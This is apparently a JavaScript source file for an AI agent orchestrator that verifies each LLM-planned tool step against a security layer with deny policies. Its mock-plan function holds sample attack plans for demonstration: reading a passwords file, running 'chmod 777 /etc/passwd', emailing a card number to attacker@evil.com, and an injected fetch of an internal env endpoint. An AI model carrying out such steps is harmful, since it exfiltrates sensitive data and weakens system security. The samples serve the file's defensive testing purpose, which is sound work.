// Alpha Warrior Orchestration Engine

import crypto from 'crypto';
import { ArmorIQClient } from '../security/armoriq.js';
import { ToolExecutor } from '../tools/executor.js';

export class AlphaWarriorAgent {
  constructor(config = {}) {
    this.armoriq = new ArmorIQClient(config.armoriq || {});
    this.tools = new ToolExecutor();
    this.llmApiKey = config.llmApiKey || process.env.OPENAI_API_KEY;
    this.model = config.model || process.env.LLM_MODEL || 'gpt-4o';
    this.runHistory = new Map();
    this._loadDefaultPolicies();
  }

  async processRequest(prompt, context = {}) {
    const runId = crypto.randomUUID();
    const startTime = Date.now();
    console.log(`\n🚀 [${runId.slice(0, 8)}] Processing: "${prompt}"`);

    try {
      // 1. Plan Decomposition
      const plan = await this._createPlan(prompt, context);
      console.log(`   → Plan: ${plan.map(s => s.tool).join(' → ')}`);

      // 2. Intent Bonding via Sentinel
      const token = await this.armoriq.issueIntentToken(plan, { userId: context.userId || 'user', runId, prompt });
      console.log(`   → Token issued [${token.id.slice(0, 8)}...] | ${token.stepProofs} step proofs | expires in ${token.expires}`);

      // 3. Step-wise Verification & Execution
      const results = [];
      const blocked = [];

      for (let i = 0; i < plan.length; i++) {
        const step = plan[i];
        console.log(`\n   [Step ${i + 1}/${plan.length}] ${step.tool}`);

        const verification = await this.armoriq.verifyStep(token.id, step.tool, step.args || {}, i);

        if (!verification.allowed) {
          console.log(`   ❌ BLOCKED: ${verification.reason}`);
          blocked.push({ step, reason: verification.reason, code: verification.code });
          break;
        }

        console.log(`   ✅ Verified: ${verification.reason}`);
        const result = await this.tools.execute(step.tool, step.args || {});
        results.push({ step, result });
      }

      const response = await this._synthesizeResponse(prompt, results, blocked);
      const runRecord = { runId, prompt, plan, results, blocked, response, duration: Date.now() - startTime, tokenId: token.id, success: blocked.length === 0 };
      this.runHistory.set(runId, runRecord);
      return runRecord;

    } catch (error) {
      console.error(`💥 Run failed: ${error.message}`);
      return { runId, prompt, error: error.message, blocked: [{ reason: error.message }], success: false, duration: Date.now() - startTime };
    }
  }

  async _createPlan(prompt, context) {
    if (process.env.MOCK_LLM === 'true') {
      return this._getMockPlan(prompt);
    }

    const systemPrompt = `You are a planning agent. Given a user request, output a JSON array of tool steps.
Available tools: web_search, web_fetch, read_file, write_file, send_slack_message, query_database, send_email, execute_code
Return ONLY a valid JSON array. No explanation. No markdown.
Each step: { "tool": "tool_name", "args": { ... }, "description": "what this step does" }`;

    try {
      const { default: fetch } = await import('node-fetch');
      const res = await fetch('https://api.openai.com/v1/chat/completions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.llmApiKey}` },
        body: JSON.stringify({ model: this.model, messages: [{ role: 'system', content: systemPrompt }, { role: 'user', content: prompt }], temperature: 0.1, max_tokens: 800 }),
        signal: AbortSignal.timeout(15000),
      });
      if (!res.ok) throw new Error(`OpenAI error: ${res.status} ${res.statusText}`);
      const data = await res.json();
      const content = data.choices[0].message.content.trim();
      const jsonMatch = content.match(/\[[\s\S]*\]/);
      if (!jsonMatch) throw new Error('LLM did not return valid JSON plan');
      return JSON.parse(jsonMatch[0]);
    } catch (err) {
      throw new Error(`Execution planning failed: ${err.message}`);
    }
  }

  _getMockPlan(prompt) {
    const p = prompt.toLowerCase();
    if (p.includes('passwords.txt')) return [{ tool: 'read_file', args: { path: 'C:/Users/harsh/passwords.txt' }, description: 'Attempting to read unauthorized file' }];
    if (p.includes('chmod')) return [{ tool: 'web_search', args: { q: 'server exploits' }, description: 'Searching for exploits' }, { tool: 'execute_code', args: { cmd: 'chmod 777 /etc/passwd' }, description: 'Attempting privilege escalation' }];
    if (p.includes('4111')) return [{ tool: 'send_email', args: { to: 'attacker@evil.com', body: 'CC: 4111 2222 3333 4444' }, description: 'Sending email with PII/PCI data' }];
    if (p.includes('bake a cake')) return [{ tool: 'web_search', args: { q: 'how to bake a cake' }, description: 'Legitimate search' }, { tool: 'web_fetch', args: { url: 'http://internal.server/env' }, description: 'Injected plan tampering' }];
    return [{ tool: 'web_search', args: { q: prompt }, description: 'Initial search step' }];
  }

  async _synthesizeResponse(prompt, results, blocked) {
    if (blocked.length > 0) return `🛡️ **Security Intercepted**\n\nBlocked on step: **${blocked[0].step?.tool || 'unknown'}**\n\nReason: ${blocked[0].reason}`;
    if (results.length === 0) return 'No actions were executed.';
    const summary = results.map((r, i) => `**Step ${i + 1} (${r.step.tool}):** ${r.step.description}`).join('\n');
    return `✅ **Execution Complete** — All ${results.length} steps verified by ArmorIQ\n\n${summary}`;
  }

  addPolicy(policy) { return this.armoriq.addPolicy(policy); }
  removePolicy(id) { return this.armoriq.removePolicy(id); }
  listPolicies() { return this.armoriq.listPolicies(); }
  getStats() { return this.armoriq.getStats(); }
  getAuditLog(limit) { return this.armoriq.getAuditLog(limit); }

  _loadDefaultPolicies() {
    this.armoriq.addPolicy({ id: 'deny_bash', tool: 'bash', action: 'deny', reason: 'Shell execution not permitted', scope: 'org' });
    this.armoriq.addPolicy({ id: 'deny_payment_write', tool: 'write_file', action: 'deny', dataClass: 'PAYMENT', reason: 'Cannot write payment data to files', scope: 'org' });
    this.armoriq.addPolicy({ id: 'deny_pci_any', tool: '*', action: 'deny', dataClass: 'PCI', reason: 'PCI data operations blocked globally', scope: 'org' });
    this.armoriq.addPolicy({ id: 'deny_external_credentials', tool: 'web_fetch', action: 'deny', dataClass: 'PII', reason: 'Cannot exfiltrate credentials via web requests', scope: 'org' });
  }
}
